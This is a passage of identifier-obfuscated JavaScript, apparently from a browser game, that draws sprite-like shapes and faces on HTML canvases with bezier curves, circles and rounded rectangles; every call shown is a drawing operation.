Δ.bezierCurveTo(ᐃ * 42, 49 * ᐃ, 55 * ᐃ, 51 * ᐃ, 55 * ᐃ, ᐃ * 44), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ᐃΔⲆΔᐃ], Ⲇᐃ[ⵠⵠⲆⵠΔ], ᐃ * 3), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ], Δ.moveTo(48 * ᐃ, 49 * ᐃ), Δ.bezierCurveTo(ᐃ * 50, 50 * ᐃ, 50 * ᐃ, ᐃ * 50, 52 * ᐃ, 51 * ᐃ), Δ.bezierCurveTo(50.5 * ᐃ, 52 * ᐃ, 50.5 * ᐃ, 52 * ᐃ, ᐃ * 49, 53 * ᐃ), Δ.bezierCurveTo(ᐃ * 51, ᐃ * 54.5, ᐃ * 51, ᐃ * 54.5, 53 * ᐃ, 56 * ᐃ), Δ.bezierCurveTo(ᐃ * 51, 57.5 * ᐃ, 51 * ᐃ, 57.5 * ᐃ, 49 * ᐃ, 59 * ᐃ), Δ.closePath(), ΔⲆ(Δ, undefined, Ⲇᐃ[6], 3 * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ᐃᐃⲆᐃ], Δ.lineJoin = ⵠ[ΔⵠⲆⲆ], Δ.moveTo(54 * ᐃ, ᐃ * 39), Δ.bezierCurveTo(61.5 * ᐃ, 39.5 * ᐃ, 61.5 * ᐃ, 39.5 * ᐃ, 69 * ᐃ, 40 * ᐃ), Δ.closePath(), ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, Ⲇᐃ[ⲆᐃⲆᐃ], 3 * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(55 * ᐃ, ᐃ * 43), Δ.bezierCurveTo(ᐃ * 61.5, ᐃ * 43.5, ᐃ * 61.5, ᐃ * 43.5, 68 * ᐃ, ᐃ * 44), Δ.closePath(), ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[6], ⵠᐃⵠⲆ * ᐃ), Δ.translate(27 * ᐃ, ᐃ * ⲆΔⲆᐃ), ⵠᐃᐃ(Δ, ᐃ * 35, ᐃ * 75, 15 * ᐃ), ΔⲆ(Δ, Ⲇᐃ[9]), ⵠᐃᐃ(Δ, 85 * ᐃ, 75 * ᐃ, ᐃ * 15), ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃᐃΔⲆⵠ]), ⵠᐃᐃ(Δ, 32 * ᐃ, 67 * ᐃ, ᐃΔΔΔ * ᐃ), ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆᐃ]), ⵠᐃᐃ(Δ, ᐃ * 82, 67 * ᐃ, ΔᐃΔⲆ * ᐃ), ΔⲆ(Δ, Ⲇᐃ[10]))
			}
			return Ⲇⵠ
		}
		const ᐃⲆⵠΔΔⵠⲆⵠⲆ = ⵠⲆⵠⵠⵠⵠᐃ;

		function ⲆⲆⵠⵠⲆⲆΔᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 70;
			Ⲇⵠ.height = 70 * ᐃ;
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 26 * ᐃ, ᐃ * 26, 9 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 56, 36 * ᐃ, 9 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			ⵠᐃᐃ(Δ, 40 * ᐃ, 50 * ᐃ, 9 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.globalAlpha = ⵠΔⲆ;
			ⵠᐃᐃ(Δ, 26 * ᐃ, ᐃ * 26, ⵠⲆⵠⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 56, 36 * ᐃ, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			ⵠᐃᐃ(Δ, ᐃ * 40, ᐃ * 50, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			return Ⲇⵠ
		}

		function ⵠⲆᐃⲆⲆΔⵠᐃⵠ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 175 * ᐃ;
			Ⲇⵠ.height = ᐃ * 150;
			if (ⵠᐃ == ⲆⲆⲆᐃ) {
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * -88, ᐃ * -95);
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 195.5);
				Ⲇᐃᐃ(Δ, -82 * ᐃ, ᐃ * -46.5, 164 * ᐃ, ᐃ * 93, 30 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 170.5);
				Ⲇᐃᐃ(Δ, ᐃ * -81, -59.5 * ᐃ, ᐃ * 162, ᐃ * 119, 28 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[ⲆᐃᐃⲆ], 6.5 * ᐃ);
				ⵠᐃᐃ(Δ, ᐃ * 137, 200 * ᐃ, ᐃ * 22.090722034374522);
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
				ⵠᐃᐃ(Δ, ᐃ * 210, ᐃ * 200, ᐃ * 22.20360331117452);
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ]);
				ⵠᐃᐃ(Δ, ᐃ * 131, 194 * ᐃ, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, ᐃ * 206, 194 * ᐃ, ᐃᐃⵠⵠⵠ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.translate(Δᐃᐃᐃ, ⵠⲆΔ * ᐃ);
				Δ.save();
				Δ.translate(ᐃ * 138.5, 180.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -22.5 * ᐃ, -11.5 * ᐃ, 45 * ᐃ, 23 * ᐃ, 0 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ]);
				Δ.save();
				Δ.translate(207 * ᐃ, 177.5 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -31, -9.5 * ᐃ, 62 * ᐃ, ᐃ * ⲆⲆΔⲆⲆᐃᐃ, 0 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.save();
				Δ.translate(ᐃ * 171.5, 220 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -52.5, -2 * ᐃ, 105 * ᐃ, 4 * ᐃ, 0 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else if (ⵠΔΔ == ⵠᐃ) {
				Δ.globalAlpha = .5;
				Δ.translate(-88 * ᐃ, -95 * ᐃ);
				Δ.save();
				Δ.translate(ᐃ * 174, 195.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -82 * ᐃ, -46.5 * ᐃ, 164 * ᐃ, 93 * ᐃ, 30 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
				Δ.globalAlpha = ⵠΔΔ;
				Δ.save();
				Δ.translate(ᐃ * 174, 170.5 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -81, ᐃ * -59.5, 162 * ᐃ, ᐃ * 119, 28 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δᐃⵠⵠ], 6.5 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
				Δ.moveTo(ᐃ * 183, ᐃ * 223);
				Δ.bezierCurveTo(193 * ᐃ, ᐃ * 187, 215 * ᐃ, 193 * ᐃ, 227 * ᐃ, 159 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 227, 194 * ᐃ, ᐃ * 209, ᐃ * 187, ᐃ * 183, 223 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				ⵠᐃᐃ(Δ, 137 * ᐃ, ᐃ * 200, 22.090722034374522 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ]);
				ⵠᐃᐃ(Δ, ᐃ * 210, 200 * ᐃ, 22.20360331117452 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, ᐃ * 131, ᐃ * 190, 7 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, 204 * ᐃ, ᐃ * 190, ΔⲆΔᐃᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 120, 154 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 125, 146 * ᐃ, 131 * ᐃ, 143 * ᐃ, 147 * ᐃ, 137 * ᐃ);
				Δ.bezierCurveTo(139 * ᐃ, ᐃ * 147, ᐃ * 129, ᐃ * 152, ᐃ * 121, ᐃ * 154);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(120 * ᐃ, ᐃ * 162);
				Δ.bezierCurveTo(134 * ᐃ, 153 * ᐃ, ᐃ * 139, ᐃ * 149, 150 * ᐃ, 144 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 143, 155 * ᐃ, 128 * ᐃ, 163 * ᐃ, ᐃ * 121, ᐃ * 161);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
				Δ.moveTo(127 * ᐃ, 142 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 129, ᐃ * 151, 132 * ᐃ, ᐃ * 157, ᐃ * 137, ᐃ * 162);
				Δ.bezierCurveTo(134 * ᐃ, ᐃ * 152, ᐃ * 132, 146 * ᐃ, ᐃ * 127, 142 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 135, 140 * ᐃ);
				Δ.bezierCurveTo(141 * ᐃ, ᐃ * 144, 143 * ᐃ, ᐃ * 150, ᐃ * 143, ᐃ * 157);
				Δ.bezierCurveTo(ᐃ * 138, ᐃ * 150, 136 * ᐃ, ᐃ * 145, ᐃ * 135, ᐃ * 140);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⵠ])
			} else if (ⵠᐃ == ᐃⲆⵠᐃ) {
				Δ.globalAlpha = .5;
				Δ.translate(-88 * ᐃ, -95 * ᐃ);
				Δ.save();
				Δ.translate(ᐃ * 174, 195.5 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -82, ᐃ * -46.5, ᐃ * 164, 93 * ᐃ, 30 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.save();
				Δ.translate(174 * ᐃ, ᐃ * 170.5);
				Ⲇᐃᐃ(Δ, -81 * ᐃ, -59.5 * ᐃ, 162 * ᐃ, ᐃ * 119, 28 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[Δᐃⵠⵠ], ᐃ * 6.5);
				ⵠᐃᐃ(Δ, 137 * ᐃ, ᐃ * 200, ᐃ * 22.090722034374522);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ]);
				ⵠᐃᐃ(Δ, 210 * ᐃ, ᐃ * 200, 22.20360331117452 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, ᐃ * 130, ᐃ * 192, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃⲆ]);
				ⵠᐃᐃ(Δ, 203 * ᐃ, ᐃ * 192, ᐃ * ᐃⵠᐃⵠⵠΔᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(115 * ᐃ, 224 * ᐃ);
				Δ.bezierCurveTo(173 * ᐃ, 223.5 * ᐃ, ᐃ * 173, ᐃ * 223.5, 231 * ᐃ, 223 * ᐃ);
				Δ.bezierCurveTo(230 * ᐃ, 222 * ᐃ, ᐃ * 198, 223 * ᐃ, 186 * ᐃ, 209 * ᐃ);
				Δ.bezierCurveTo(173.5 * ᐃ, ᐃ * 209, 173.5 * ᐃ, ᐃ * 209, 161 * ᐃ, 209 * ᐃ);
				Δ.bezierCurveTo(146 * ᐃ, ᐃ * 224, ᐃ * 114, ᐃ * 223, 116 * ᐃ, 224 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(112 * ᐃ, 193 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 154, ᐃ * 182, ᐃ * 194, 183 * ᐃ, ᐃ * 234, 192 * ᐃ);
				Δ.bezierCurveTo(217 * ᐃ, ᐃ * 154, ᐃ * 148, 127 * ᐃ, ᐃ * 112, 192 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else if (3 == ⵠᐃ) {
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * -88, -95 * ᐃ);
				Δ.save();
				Δ.translate(174 * ᐃ, ᐃ * 195.5);
				Ⲇᐃᐃ(Δ, ᐃ * -82, -46.5 * ᐃ, ᐃ * 164, 93 * ᐃ, ᐃ * 30);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ᐃⲆᐃ;
				Δ.save();
				Δ.translate(174 * ᐃ, ᐃ * 170.5);
				Ⲇᐃᐃ(Δ, ᐃ * -81, -59.5 * ᐃ, 162 * ᐃ, ᐃ * 119, 28 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇⵠⵠᐃ], ᐃ * 6.5);
				ⵠᐃᐃ(Δ, 137 * ᐃ, 200 * ᐃ, 22.090722034374522 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, ᐃ * 210, ᐃ * 200, 22.20360331117452 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ]);
				ⵠᐃᐃ(Δ, 130 * ᐃ, ᐃ * 192, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, 203 * ᐃ, ᐃ * 192, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(120 * ᐃ, ᐃ * 176);
				Δ.bezierCurveTo(ᐃ * 175, 193 * ᐃ, ᐃ * 147.5, ᐃ * 184.5, 175 * ᐃ, 193 * ᐃ);
				Δ.bezierCurveTo(200 * ᐃ, 184.5 * ᐃ, ᐃ * 200, 184.5 * ᐃ, 225 * ᐃ, ᐃ * 176);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(226 * ᐃ, ᐃ * 223);
				Δ.bezierCurveTo(173.5 * ᐃ, ᐃ * 223, ᐃ * 173.5, ᐃ * 223, 121 * ᐃ, ᐃ * 223);
				Δ.bezierCurveTo(148 * ᐃ, 218 * ᐃ, 148 * ᐃ, 218 * ᐃ, 175 * ᐃ, 213 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ])
			} else if (ⵠᐃ == ⵠᐃᐃⲆ) {
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * -88, ᐃ * -95);
				Δ.save();
				Δ.translate(174 * ᐃ, ᐃ * 195.5);
				Ⲇᐃᐃ(Δ, ᐃ * -82, -46.5 * ᐃ, 164 * ᐃ, ᐃ * 93, ᐃ * 30);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
				Δ.globalAlpha = ᐃⲆᐃ;
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 170.5);
				Δ.rotate(ⵠⲆᐃⵠ);
				Ⲇᐃᐃ(Δ, -81 * ᐃ, ᐃ * -59.5, 162 * ᐃ, ᐃ * 119, ᐃ * 28);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], 6.5 * ᐃ);
				ⵠᐃᐃ(Δ, ᐃ * 137, 200 * ᐃ, 22.090722034374522 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ]);
				ⵠᐃᐃ(Δ, 210 * ᐃ, 200 * ᐃ, 22.20360331117452 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠΔ]);
				ⵠᐃᐃ(Δ, 137 * ᐃ, 203 * ᐃ, ᐃ * ⲆⲆᐃⵠΔ);
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ]);
				ⵠᐃᐃ(Δ, 209 * ᐃ, 203 * ᐃ, 8 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.save();
				Δ.translate(ᐃ * 174.5, 218 * ᐃ);
				Δ.rotate(0);
				Ⲇᐃᐃ(Δ, -60.5 * ᐃ, ᐃ * -5, ᐃ * 121, ⲆⵠⲆⵠⲆ * ᐃ, 28 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 113, ᐃ * 190);
				Δ.bezierCurveTo(144 * ᐃ, ᐃ * 181.5, ᐃ * 144, 181.5 * ᐃ, 175 * ᐃ, 173 * ᐃ);
				Δ.bezierCurveTo(205 * ᐃ, 182 * ᐃ, ᐃ * 205, ᐃ * 182, 235 * ᐃ, ᐃ * 191);
				Δ.bezierCurveTo(242 * ᐃ, ᐃ * 141, ᐃ * 106, 119 * ᐃ, ᐃ * 112, 189 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ])
			} else if (ⵠᐃ == ᐃⲆⵠⵠ) {
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * -88, -95 * ᐃ);
				Δ.save();
				Δ.translate(174 * ᐃ, ᐃ * 195.5);
				Ⲇᐃᐃ(Δ, ᐃ * -82, -46.5 * ᐃ, 164 * ᐃ, ᐃ * 93, ᐃ * 30);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔΔᐃⵠ;
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 170.5);
				Δ.rotate(0);
				Ⲇᐃᐃ(Δ, -81 * ᐃ, -59.5 * ᐃ, ᐃ * 162, 119 * ᐃ, ᐃ * 28);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[2], ᐃ * 6.5);
				ⵠᐃᐃ(Δ, ᐃ * 137, ᐃ * 200, 22.090722034374522 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, ᐃ * 210, ᐃ * 200, ᐃ * 22.20360331117452);
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ]);
				ⵠᐃᐃ(Δ, ᐃ * 140, 196 * ᐃ, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, ᐃ * 213, ᐃ * 196, ᐃⵠⲆᐃΔⵠᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃΔ]);
				ⵠᐃᐃ(Δ, ᐃ * 131, ᐃ * 206, ⵠΔΔΔΔ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, 204 * ᐃ, 206 * ᐃ, ⲆᐃΔᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(113 * ᐃ, ᐃ * 181);
				Δ.bezierCurveTo(159 * ᐃ, ᐃ * 204, 190 * ᐃ, 202 * ᐃ, ᐃ * 235, ᐃ * 181);
				Δ.bezierCurveTo(241 * ᐃ, 137 * ᐃ, 109 * ᐃ, ᐃ * 130, 112 * ᐃ, ᐃ * 180);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ]);
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 220);
				Δ.rotate(0);
				Ⲇᐃᐃ(Δ, -56 * ᐃ, -5 * ᐃ, 112 * ᐃ, ᐃ * ⵠⲆⲆᐃⵠ, ⲆⵠⲆⲆ * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else if (ⵠⲆⵠⲆΔ == ⵠᐃ) {
				Δ.globalAlpha = .5;
				Δ.translate(-88 * ᐃ, ᐃ * -95);
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 195.5);
				Ⲇᐃᐃ(Δ, ᐃ * -82, ᐃ * -46.5, ᐃ * 164, 93 * ᐃ, ᐃ * 30);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
				Δ.globalAlpha = 1;
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 170.5);
				Ⲇᐃᐃ(Δ, -81 * ᐃ, ᐃ * -59.5, 162 * ᐃ, 119 * ᐃ, 28 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 6.5);
				ⵠᐃᐃ(Δ, 137 * ᐃ, 200 * ᐃ, ᐃ * 22.090722034374522);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, ᐃ * 210, ᐃ * 200, 22.20360331117452 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, 133 * ᐃ, ᐃ * 188, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ]);
				ⵠᐃᐃ(Δ, 206 * ᐃ, 188 * ᐃ, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠᐃ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
				Δ.moveTo(ᐃ * 110, 193 * ᐃ);
				Δ.bezierCurveTo(130 * ᐃ, 182 * ᐃ, 142 * ᐃ, 183 * ᐃ, ᐃ * 162, 193 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 164, ᐃ * 176.5, 164 * ᐃ, 176.5 * ᐃ, 166 * ᐃ, 160 * ᐃ);
				Δ.bezierCurveTo(137 * ᐃ, ᐃ * 159, ᐃ * 137, 159 * ᐃ, 108 * ᐃ, 158 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
				Δ.moveTo(ᐃ * 184, ᐃ * 192);
				Δ.bezierCurveTo(205 * ᐃ, 183 * ᐃ, 216 * ᐃ, ᐃ * 183, ᐃ * 234, 192 * ᐃ);
				Δ.bezierCurveTo(233.5 * ᐃ, 177 * ᐃ, 233.5 * ᐃ, 177 * ᐃ, 233 * ᐃ, ᐃ * 162);
				Δ.bezierCurveTo(ᐃ * 209, ᐃ * 161.5, ᐃ * 186, 162 * ᐃ, 185 * ᐃ, 161 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else if (ⵠᐃ == 7) {
				Δ.globalAlpha = .5;
				Δ.translate(-88 * ᐃ, ᐃ * -95);
				Δ.save();
				Δ.translate(174 * ᐃ, 195.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -82 * ᐃ, ᐃ * -46.5, ᐃ * 164, 93 * ᐃ, ᐃ * 30);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.save();
				Δ.translate(ᐃ * 174, ᐃ * 170.5);
				Ⲇᐃᐃ(Δ, -81 * ᐃ, -59.5 * ᐃ, ᐃ * 162, ᐃ * 119, ᐃ * 28);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 6.5);
				ⵠᐃᐃ(Δ, ᐃ * 137, ᐃ * 200, 22.090722034374522 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, ᐃ * 210, 200 * ᐃ, 22.20360331117452 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
				ⵠᐃᐃ(Δ, ᐃ * 130, 206 * ᐃ, ᐃ * 7);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, 203 * ᐃ, 206 * ᐃ, ᐃⲆⲆᐃᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(108 * ᐃ, ᐃ * 191);
				Δ.bezierCurveTo(141 * ᐃ, 184 * ᐃ, 141 * ᐃ, ᐃ * 184, ᐃ * 174, ᐃ * 177);
				Δ.bezierCurveTo(ᐃ * 207, ᐃ * 184, 207 * ᐃ, 184 * ᐃ, ᐃ * 240, 191 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 244, ᐃ * 140, 113 * ᐃ, ᐃ * 121, 108 * ᐃ, ᐃ * 191);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else if (8 == ⵠᐃ) {
				Δ.globalAlpha = .5;
				Δ.translate(-88 * ᐃ, ᐃ * -95);
				Δ.save();
				Δ.translate(174 * ᐃ, ᐃ * 195.5);
				Ⲇᐃᐃ(Δ, -82 * ᐃ, ᐃ * -46.5, 164 * ᐃ, ᐃ * 93, 30 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ⲆⵠⲆⲆ;
				Δ.save();
				Δ.translate(174 * ᐃ, 170.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -81 * ᐃ, -59.5 * ᐃ, ᐃ * 162, ᐃ * 119, ᐃ * 28);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[2], ᐃ * 6.5);
				ⵠᐃᐃ(Δ, ᐃ * 137, 200 * ᐃ, ᐃ * 22.090722034374522);
				ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ]);
				ⵠᐃᐃ(Δ, ᐃ * 210, ᐃ * 200, ᐃ * 22.20360331117452);
				ΔⲆ(Δ, Ⲇᐃ[3]);
				ⵠᐃᐃ(Δ, 127 * ᐃ, ᐃ * 198, ᐃ * ⲆᐃᐃᐃΔ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, 200 * ᐃ, 198 * ᐃ, ΔⲆΔᐃᐃ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.save();
				Δ.translate(ᐃ * 175, 175.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -67 * ᐃ, ᐃ * -13.5, 134 * ᐃ, 27 * ᐃ, ᐃ * 0);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ]);
				Δ.save();
				Δ.translate(ᐃ * 172, 219 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -60, ᐃ * -4, ᐃ * 120, ᐃ * 8, ᐃ * ᐃΔΔ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ])
